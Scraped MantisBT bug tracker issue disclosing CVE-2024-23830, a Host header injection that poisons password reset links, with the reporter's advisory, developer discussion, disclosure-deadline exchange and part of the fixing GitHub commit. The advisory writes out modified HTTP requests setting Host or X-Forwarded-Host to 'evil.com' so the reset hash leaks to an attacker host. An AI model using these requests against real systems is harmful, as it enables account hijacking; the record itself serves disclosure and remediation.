=== Content from mantisbt.org_81c16098_20250111_190700.html ===

Toggle sidebar [MantisBT](/bugs//) Toggle user menu

* mantisbt

  + - [All Projects](/bugs/set_project.php?project_id=0)
    - [mantisbt](/bugs/set_project.php?project_id=1)
    - [Mylyn Connector](/bugs/set_project.php?project_id=20)
    - [Plugin - agileMantis](/bugs/set_project.php?project_id=25)
    - [Plugin - CsvImport](/bugs/set_project.php?project_id=11)
    - [Plugin - CustomerManagement](/bugs/set_project.php?project_id=21)
    - [Plugin - EmailReporting](/bugs/set_project.php?project_id=10)
    - [Plugin - FilterPageEdit](/bugs/set_project.php?project_id=15)
    - [Plugin - InlineColumnConfiguration](/bugs/set_project.php?project_id=14)
    - [Plugin - LinkedCustomFields](/bugs/set_project.php?project_id=16)
    - [Plugin - MantisTouchRedirect](/bugs/set_project.php?project_id=22)
    - [Plugin - RecurrCall](/bugs/set_project.php?project_id=6)
    - [Plugin - RelatedIssuesExport](/bugs/set_project.php?project_id=13)
    - [Plugin - Reminder](/bugs/set_project.php?project_id=7)
    - [Plugin - Tasks](/bugs/set_project.php?project_id=8)
    - [Plugin - Time Tracking](/bugs/set_project.php?project_id=18)
* anonymous
  + [RSS](https://mantisbt.org/bugs/issues_rss.php)
  + [Logout](/bugs/logout_page.php)

* [My View](/bugs/my_view_page.php)
* [View Issues](/bugs/view_all_bug_page.php)
* [Change Log](/bugs/changelog_page.php)
* [Roadmap](/bugs/roadmap_page.php)
* [Wiki](/bugs/wiki.php?type=project&id=1)
* [Repositories](/bugs/plugin.php?page=Source/index)

* Anonymous
[Login](/bugs/login_page.php?return=%2Fbugs%2Fview.php%3Fid%3D19381)
[Signup for a new account](/bugs/signup_page.php)

#### View Issue Details

[Wiki](wiki.php?id=19381)[Related Changesets](#changesets)[Jump to Notes](#bugnotes)

|  | | | | | |
| --- | --- | --- | --- | --- | --- |
| ID | Project | Category | View Status | Date Submitted | Last Update |
| --- | --- | --- | --- | --- | --- |
| 0019381 | mantisbt | security | public | 2015-02-18 09:26 | 2024-02-20 19:36 |
|  | | | | | |
|
| Reporter | [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976) | Assigned To | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) |  | |
| Priority | high | Severity | major | Reproducibility | always |
| Status | closed | Resolution | fixed |  | |
| Product Version | 1.2.19 |  | | | |
| Target Version | 2.26.1 | Fixed in Version | 2.26.1 |  | |
|  | | | | | |
|
| Summary | 0019381: CVE-2024-23830: Host header attack vulnerability | | | | |
| Description | Advisory: MantisBT 1.2.19 - Host header attack vulnerability Author: Pier-Luc Maltais Affected Software: MantisBT 1.2.19 Vendor URL: <https://www.mantisbt.org/> Vulnerability Description: MantisBT 1.2.19 is vulnerable to an Host header attack that can be exploited by an unauthenticated user to hijack another user account. Technical Details: This exploit use the Host header attack to poison the link in the password reset mail. You need to know the victim username and e-mail. You also need a remote host that you control to catch the verification hash needed for password reset.   1. Access the password reset feature and fill the form with the    victim username and e-mail.  <http://{VULNERABLE_MANTIS}/mantisbt/lost_pwd_page.php> 2. Using an intercepting proxy like Burp, change the Host header    with your evil host.  Original request :  POST /mantisbt/lost\_pwd\_page.php HTTP/1.1    Host : {VULNERABLE\_MANTIS}    [...]  Modified request :  POST /mantisbt/lost\_pwd\_page.php HTTP/1.1    Host : evil.com    [...] 3. When the user receive the e-mail, the link is poisoned with    the evil host.  [...]    visit the following URL to change your password:    <http://evil.com/mantisbt/verify.php?id=1&confirm_hash=81ece020dfcd6d53e02c5323583cdead>    [...] 4. Now, when the victim click on the link to reset his password,    his verification hash will be sent to our evil host. All we    have to do is access the verify.php page with his hash, so    we can change his password and hijack his account.  <http://{VULNERABLE_MANTIS}/mantisbt/verify.php?id=1&confirm_hash=81ece020dfcd6d53e02c5323583cdead>  Solution: Use $\_SERVER['SERVER\_NAME'] (server controlled) instead of $\_SERVER['HTTP\_HOST'] (client controlled) Disclosure Timeline: 16/02/2015 - Found the vulnerability 17/02/2015 - Wrote this advisory 17/02/2015 - Contacted developers on MantisBT forum 18/02/2015 - Opened an issue in the bug tracker References: [1] <http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html> [2] <http://stackoverflow.com/questions/2297403/http-host-vs-server-name/2297421#2297421> | | | | |
| Additional Information | I would like to be credited for the finding. Name : Pier-Luc Maltais Email : pierluc.maltais@gmail.com Twitter: <https://twitter.com/plmaltais> Github: <https://github.com/plmaltais> | | | | |
| Tags | No tags attached. | | | | |
| Attached Files | [mantis\_1.2.19\_host\_header\_attack.txt](file_download.php?file_id=6202&type=bug) (2,433 bytes)    ``` Advisory: MantisBT 1.2.19 - Host header attack vulnerability Author: Pier-Luc Maltais Affected Software: MantisBT 1.2.19 Vendor URL: https://www.mantisbt.org/  ========================== Vulnerability Description: ==========================  MantisBT 1.2.19 is vulnerable to an Host header attack that can be exploited by an unauthenticated user to hijack another user account.   ================== Technical Details: ==================  This exploit use the Host header attack to poison the link in the password reset mail. You need to know the victim username and  e-mail. You also need a remote host that you control to catch the  verification hash needed for password reset.  1.  Access the password reset feature and fill the form with the     victim username and e-mail.      http://{VULNERABLE_MANTIS}/mantisbt/lost_pwd_page.php  2.  Using an intercepting proxy like Burp, change the Host header      with your evil host.      Original request :          POST /mantisbt/lost_pwd_page.php HTTP/1.1     Host : {VULNERABLE_MANTIS}     [...]          Modified request :           POST /mantisbt/lost_pwd_page.php HTTP/1.1     Host : evil.com     [...]      3.  When the user receive the e-mail, the link is poisoned with      the evil host.      [...]     visit the following URL to change your password:      http://evil.com/mantisbt/verify.php?id=1&confirm_hash=81ece020dfcd6d53e02c5323583cdead      [...]      4.  Now, when the victim click on the link to reset his password,     his verification hash will be sent to our evil host. All we      have to do is access the verify.php page with his hash, so     we can change his password and hijack his account.          http://{VULNERABLE_MANTIS}/mantisbt/verify.php?id=1&confirm_hash=81ece020dfcd6d53e02c5323583cdead    ========= Solution: =========  Use  $_SERVER['SERVER_NAME'] (server controlled)  instead of  $_SERVER['HTTP_HOST'] (client controlled)   ==================== Disclosure Timeline: ====================  16/02/2015 - Found the vulnerability 17/02/2015 - Wrote this advisory 17/02/2015 - Contacted developers on MantisBT forum 18/02/2015 - Opened an issue in the bug tracker   =========== References: ===========  [1] http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html [2] http://stackoverflow.com/questions/2297403/http-host-vs-server-name/2297421#2297421 ```   [mantis\_1.2.19\_host\_header\_attack.txt](file_download.php?file_id=6202&type=bug) (2,433 bytes) | | | | |
|  | | | | | |
|

#### Relationships

[Relationship Graph](bug_relationship_graph.php?bug_id=19381&graph=relation)[Dependency Graph](bug_relationship_graph.php?bug_id=19381&graph=dependency)

| has duplicate | [0026434](view.php?id=26434) | closed | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) | Use of \_SERVER['HTTP\_HOST'], \_SERVER['SERVER\_NAME'], and \_SERVER['HTTP\_X\_FORWARDED\_HOST'] should be avoided |
| --- | --- | --- | --- | --- |
| related to | [0033791](view.php?id=33791) | closed | [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) | Travis CI builds are timing out |

#### Activities

| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2015-02-18 11:10  developer    [~0048858](view.php?id=19381#c48858 "Direct link to note") | Hello  Many thanks for the detailed bug report. I will look into it and let you know when a fix is available for testing.  Have you reserved a CVE for this, or should I do it ? |
| --- | --- |
|  | |
| [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)   [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)  2015-02-18 11:15  reporter    [~0048859](view.php?id=19381#c48859 "Direct link to note") | Hi,  No, I didn't reserve a CVE, you can do it. Let me know if you have any questions.  Pier-Luc |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2015-02-18 12:23  developer    [~0048861](view.php?id=19381#c48861 "Direct link to note") | I just had a quick look at the code, and I reckon this vulnerability would only affect MantisBT instances relying on the default mechanism to determine the server path [1].  I'm not so keen on using SERVER\_NAME only as that may not work in all situations since it is dependent on the web server's setup.  Maybe a better approach would be to get rid of the unsafe use of HTTP\_HOST in the detection mechanism or trigger a warning if it's being used, and let the admin set the (canonical) path in config\_inc.php. Another option would be to introduce a new setting to validate the path (similar to what Drupal did), but maybe that's overkill.  I need to think some more about this.  [1] <https://github.com/mantisbt/mantisbt/blob/master/config_defaults_inc.php#L176> |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2015-02-18 12:24  developer    [~0048862](view.php?id=19381#c48862 "Direct link to note") | **Reminder sent to: [atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111), [rombert](https://mantisbt.org/bugs/view_user_page.php?id=10368), [vboctor](https://mantisbt.org/bugs/view_user_page.php?id=3081)** Your thoughts on this would be appreciated. |
|  | |
| [atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111)   [atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111)  2015-02-18 17:02  developer    [~0048864](view.php?id=19381#c48864 "Direct link to note") | No time for tests, thus just some thoughts.  We could completely remove access of $\_SERVER['HTTP\_HOST'] in master 1.3.x, and wait for feedback of users. Another option for 1.3.x is to change order of the $t\_host assignment, set a global variable if $\_SERVER['HTTP\_HOST'] is used, check for the variable in admin/check and login\_page.php (if $g\_admin\_checks is set) and provide a warning if the variable is set.  ```  $g_http_host_used = false; if( isset( $_SERVER['HTTP_X_FORWARDED_HOST'] ) ) { # Support ProxyPass $t_hosts = explode( ',', $_SERVER['HTTP_X_FORWARDED_HOST'] ); $t_host = $t_hosts[0]; } else if( isset( $_SERVER['SERVER_NAME'] ) ) { $t_host = $_SERVER['SERVER_NAME'] . $t_port; } else if( isset( $_SERVER['SERVER_ADDR'] ) ) { $t_host = $_SERVER['SERVER_ADDR'] . $t_port; } else if( isset( $_SERVER['HTTP_HOST'] ) ) { $t_host = $_SERVER['HTTP_HOST']; $g_http_host_used = true; }  ```  Furthermore we would have to describe the configuration of the web server in this case and describe also the right setting for $g\_path in config\_inc.php if configuration of the web server is not possible or does not work.  Not sure if we could do the same for 1.2.x and risk breaking existing installations. Especially because we are hardly able to test all possible combinations of supported PHP versions and different web servers and versions.  Every kind of potentially breaking change would have to be described in installation/upgrade guide and would have to be part of the release announcement of 1.2.20.  BTW, I found that the code block in master starting with if( !isset( $\_SERVER['SCRIPT\_NAME'] )) { <https://github.com/mantisbt/mantisbt/blame/master/config_defaults_inc.php#L187> is dead code. It's in a block that starts with if( isset ( $\_SERVER['SCRIPT\_NAME'] ) ) { |
|  | |
| [vboctor](https://mantisbt.org/bugs/view_user_page.php?id=3081)   [vboctor](https://mantisbt.org/bugs/view_user_page.php?id=3081)  2015-02-19 00:40  manager    [~0048868](view.php?id=19381#c48868 "Direct link to note") | If the MantisBT host is compromised, why would the evil code just go change the database rather than this round about way? Am I missing something? |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2015-02-19 03:12  developer    [~0048872](view.php?id=19381#c48872 "Direct link to note") | [@vboctor](https://mantisbt.org/bugs/view_user_page.php?id=3081)  The MantisBT host is not compromised.  The issue is that we rely on the client-provided HTTP\_HOST to build $g\_path, allowing an attacker to initiate a password reset process for any user for which they know the id and password, and by inserting "evil.com" instead of "mantisbt.org", the e-mail we send to the user will point them back to "evil.com" thus letting the attacker retrieve the verification key and using it to hijack the user's account.  Obviously this requires the user to actually click the link without verifying it.  [@atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111)  Thanks for your feedback. Your suggestion goes along the lines of what I was thinking.  Good catch also with the dead code block.  @Pier-Luc  You mentioned a blog in your forum post [1], does that need to be referenced in the CVE ? If so please provide the URL.  One more question, about the use of HTTP\_X\_FORWARDED\_HOST - I have not actually tested this, but would assume that this can be spoofed in the same way you described above, right ?  [1] <https://www.mantisbt.org/forums/viewtopic.php?f=2&t=22938> |
|  | |
| [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)   [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)  2015-02-20 11:28  reporter    [~0048880](view.php?id=19381#c48880 "Direct link to note") | I did a quick test on my installation, without actually using a proxy. I added the X-Forwarded-Host header line in the request :  POST /mantisbt/lost\_pwd.php HTTP/1.1 Host: 192.168.101.90 X-Forwarded-Host: evil.com [...]  and the link was poisonned with evil.com.  For the blog, you can provide this URL: plmsecurity.net (there is nothing on there yet). |
|  | |
| [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)   [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)  2015-05-04 17:22  reporter    [~0050692](view.php?id=19381#c50692 "Direct link to note") | Hi, I just want to remind you that we are two weeks from my 3 months deadline. Did you guys have planned a patch for this issue? |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2015-05-05 03:10  developer    [~0050693](view.php?id=19381#c50693 "Direct link to note") | Thanks for the reminder, this kind of fell off the radar... |
|  | |
| [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)   [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)  2015-05-19 10:26  reporter    [~0050789](view.php?id=19381#c50789 "Direct link to note") | We reach the deadline. Please tell me if you have something planned. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2015-05-19 11:25  developer    [~0050790](view.php?id=19381#c50790 "Direct link to note") | Well I have a potential patch but did not fully test it yet (sorry, I do this in my spare time, and I unfortunately don't have much of that nowadays). We need to consider backwards compatibility before releasing anything, which makes fixing this not so trivial.  If I may make a comment, it would have been nice(r) to announce this deadline of yours up front. That being said, what are your plans moving forward - assuming we're not able to release a fix shortly ? |
|  | |
| [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)   [plmaltais](https://mantisbt.org/bugs/view_user_page.php?id=36976)  2015-05-19 12:13  reporter    [~0050791](view.php?id=19381#c50791 "Direct link to note") | I was clear with the 90 days deadline on my original post on the forum (<https://www.mantisbt.org/forums/viewtopic.php?f=2&t=22938>), but maybe I should have stated it here too.  I really don't want to go full disclosure. If I give you two more weeks, will you be able to release a patch? If not, I will relase the advisory on my blog, post it on exploit-db, share it on twitter, etc.  This vulnerability put your users informations at risk and it is your responsability to mitigate that risk, even if it's done in your spare time. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2015-05-19 14:34  developer    [~0050792](view.php?id=19381#c50792 "Direct link to note") | maybe I should have stated it here too  Indeed.  it is your responsability to mitigate that risk  I know damn well what my responsibilities are. For the record, it is also my responsibility to take care of my family, and do the job my employer pays me for. It's all a question of priorities...  Using open-source software implies accepting some risks, and an unpatched vulnerability is one of them.  That being said and despite appearances, I *do* take security issues very seriously, and will do my best to get this patch out within 2 weeks. Will let you know when the patch is ready so you can confirm whether it actually fixes the issue or not before I release it to the general public. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2024-01-29 11:09  developer    [~0068486](view.php?id=19381#c68486 "Direct link to note") | GitHub security advisory: <https://github.com/mantisbt/mantisbt/security/advisories/GHSA-mcqj-7p29-9528>  CVE-2024-23830 assigned on 29-Jan-2024. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2024-02-03 18:08  developer    [~0068503](view.php?id=19381#c68503 "Direct link to note") | Patch is available for review at <https://github.com/mantisbt/mantisbt-ghsa-mcqj-7p29-9528/pull/1>  Feedback welcome. Please get in touch with me if you have problems accessing. |
|  | |
| [atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111)   [atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111)  2024-02-10 05:47  developer    [~0068521](view.php?id=19381#c68521 "Direct link to note") | [@dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784) as an additional enhancement (must not be part of this fix), should we write $g\_path and $g\_short\_path to config\_inc.php when running a new installation? |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2024-02-10 05:50  developer    [~0068522](view.php?id=19381#c68522 "Direct link to note") | That's an idea.  I suppose you mean to achieve that by requesting the path to use at install time, with a proposed default value based on the logic I moved from config\_defaults\_inc.php to set\_default\_path() function in core.php ? |
|  | |
| [atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111)   [atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111)  2024-02-10 06:57  developer    [~0068523](view.php?id=19381#c68523 "Direct link to note") | Exactly like that. |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2024-02-10 13:08  developer    [~0068524](view.php?id=19381#c68524 "Direct link to note") | [@atrol](https://mantisbt.org/bugs/view_user_page.php?id=11111) please review <https://github.com/mantisbt/mantisbt-ghsa-mcqj-7p29-9528/pull/2> which implements your suggestion [0019381:0068521](/bugs/view.php?id=19381#c68521 "0019381: [2024-02-10 05:47] atrol") |
|  | |
| [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)   [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  2024-02-20 16:16  developer    [~0068576](view.php?id=19381#c68576 "Direct link to note") | Pull requests from temporary fork have been merged, and the advisory published <https://github.com/mantisbt/mantisbt/security/advisories/GHSA-mcqj-7p29-9528>. |
|  | |

#### Related Changesets

| MantisBT: master-2.26 7055731d  2024-02-20 16:10  [dregad](https://mantisbt.org/bugs/view_user_page.php?id=17784)  Committer: [community](https://mantisbt.org/bugs/view_user_page.php?id=36846) [Details](/bugs/plugin.php?page=Source/view&id=26948) [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) | Merge pull request from GHSA-mcqj-7p29-9528 | | Affected Issues[0019381](/bugs/view.php?id=19381 "[closed] CVE-2024-23830: Host header attack vulnerability") |
| --- | --- | --- | --- |
| mod - admin/check/check\_paths\_inc.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) [File](https://github.com/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/admin/check/check_paths_inc.php) |
| mod - admin/install.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) [File](https://github.com/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/admin/install.php) |
| mod - config\_defaults\_inc.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) [File](https://github.com/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/config_defaults_inc.php) |
| mod - core.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) [File](https://github.com/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/core.php) |
| mod - docbook/Admin\_Guide/en-US/config/path.xml | | [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) [File](https://github.com/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/docbook/Admin_Guide/en-US/config/path.xml) |
| mod - js/install.js | | [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) [File](https://github.com/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/js/install.js) |
| mod - lang/strings\_english.txt | | [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) [File](https://github.com/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/lang/strings_english.txt) |
| mod - login\_page.php | | [Diff](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744) [File](https://github.com/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/login_page.php) |

**Powered by [MantisBT 2.28.0-dev-master-a94bae75d](https://www.mantisbt.org "bug tracking software")**

Copyright © 2000 - 2025 MantisBT Team
Contact administrator for assistance

[![Powered by Mantis Bug Tracker: a free and open source web based bug tracking system.](/bugs/images/mantis_logo.png)](https://www.mantisbt.org "Mantis Bug Tracker: a free and open source web based bug tracking system.")

 Page execution time: 0.2850 seconds



=== Content from github.com_71da74c9_20250111_190658.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F7055731d09ff12b2781410a372f790172e279744)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F7055731d09ff12b2781410a372f790172e279744)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

* [Code](/mantisbt/mantisbt)
* [Pull requests
  75](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

## Commit

[Permalink](/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-mcqj-7p29-9528](https://github.com/advisories/GHSA-mcqj-7p29-9528 "GHSA-mcqj-7p29-9528")

[Browse files](/mantisbt/mantisbt/tree/7055731d09ff12b2781410a372f790172e279744)
Browse the repository at this point in the history

```
* Address host header injection vulnerability

$g_path is empty by default, and should be defined in config_inc.php.
Not doing so is a security risk, as the path will then be set based on
headers from the HTTP request, exposing the system to Host Header
injection attacks.

Document the risk in PHPDoc and Admin Guide.

Move the code that initializes $g_path's default value from
config_defaults_inc.php to a function in core.php.

Detect if $g_path was defaulted, and if yes alert the user in:
- Login Page (if $g_admin_checks == ON)
- Admin Checks

Fixes #19381, [CVE-2024-23830](https://github.com/advisories/GHSA-mcqj-7p29-9528 "CVE-2024-23830"), [GHSA-mcqj-7p29-9528](https://github.com/advisories/GHSA-mcqj-7p29-9528 "GHSA-mcqj-7p29-9528")

* Remove dead code

* Use OWASP as reference for host header injection

* Link to OWASP reference page from admin guide

* Invalid $g_path at install time is a hard fail

Empty $g_path remains just a warning about the security risk.
Request and set $g_path at install time

This is an improvement on the original patch for [CVE-2024-23830](https://github.com/advisories/GHSA-mcqj-7p29-9528 "CVE-2024-23830").

The admin is now able to set $g_path when installing MantisBT. A default
value is provided, based on the URL used to perform the installation
(using the same logic that is applied when $g_path is empty).

A check of the provided URL is performed during install stage 2, and an
error is reported if it is invalid. If an empty $g_path is given, then
we only display a warning about the security risk.

The URL is then stored as $g_path in the generated config_inc.php file
at stage 5.

This greatly reduces the risk of the admin forgetting to set $g_path
manually, while still allowing them to set it to empty should they want
to.

Fixes #19381

* Add Reset button to path input

Reuse the existing functionality implemented for database prefix/suffix,
with the following changes

- Rename `reset-prefix` selector class to `reset` to be more generic
- Add Reset functionality markup to path input including default value
- Add title attribute to Reset buttons
- Adapt initialization logic to only set the default value for the
  table-prefix fields
```

* Loading branch information

[![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)

[dregad](/mantisbt/mantisbt/commits?author=dregad "View all commits by dregad")
authored
Feb 20, 2024

1 parent
[2e1c814](/mantisbt/mantisbt/commit/2e1c81483a6caab275c3c39ddfa0cf3cb114c75e)

commit 7055731

 Show file tree

 Hide file tree

Showing
**8 changed files**
with
**229 additions**
and
**89 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* admin

  + check

    - admin/check/check\_paths\_inc.php
      [check\_paths\_inc.php](#diff-21071bbc5d0941a1eaf13d571a09637d030da8d66e2d43f20dfdbc48386aac69)
  + admin/install.php
    [install.php](#diff-458b194824e77773f4bf1441ec318c127ba9786a1651e80011c8a69c8e817072)
* config\_defaults\_inc.php
  [config\_defaults\_inc.php](#diff-e0260ebe7f7f5577fe56696994618dcb3096a6e3c43f05623dd0894dac6b7a7c)
* core.php
  [core.php](#diff-12c64b5df81f5ee6cf28ade08b1cb9e33d1e43339aa7c2aba61128d1bb57c83a)
* docbook/Admin\_Guide/en-US/config

  + docbook/Admin\_Guide/en-US/config/path.xml
    [path.xml](#diff-d49c654dbd12929170cdf2fe3a25d32ec3afaddc84881aade49fe8a4ed8ff8d2)
* js

  + js/install.js
    [install.js](#diff-67d657dd3a1103d0c7d518c7af28f72c6006ff93a1648f5734811be7303f2689)
* lang

  + lang/strings\_english.txt
    [strings\_english.txt](#diff-70f45378f62d8cccb690b0150a1dca2029462f476281547ba0d3cada797dfb07)
* login\_page.php
  [login\_page.php](#diff-78ec5b3b6abc41e8ee8f7830916b6164c71b6f49aeff09218eb20642c9ff49c8)

## There are no files selected for viewing

12 changes: 12 additions & 0 deletions

12
[admin/check/check\_paths\_inc.php](#diff-21071bbc5d0941a1eaf13d571a09637d030da8d66e2d43f20dfdbc48386aac69 "admin/check/check_paths_inc.php")

Show comments

[View file](/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/admin/check/check_paths_inc.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,6 +36,18 @@ |
|  |  |  |
|  |  | check\_print\_section\_header\_row( 'Paths' ); |
|  |  |  |
|  |  | global $g\_defaulted\_path; |
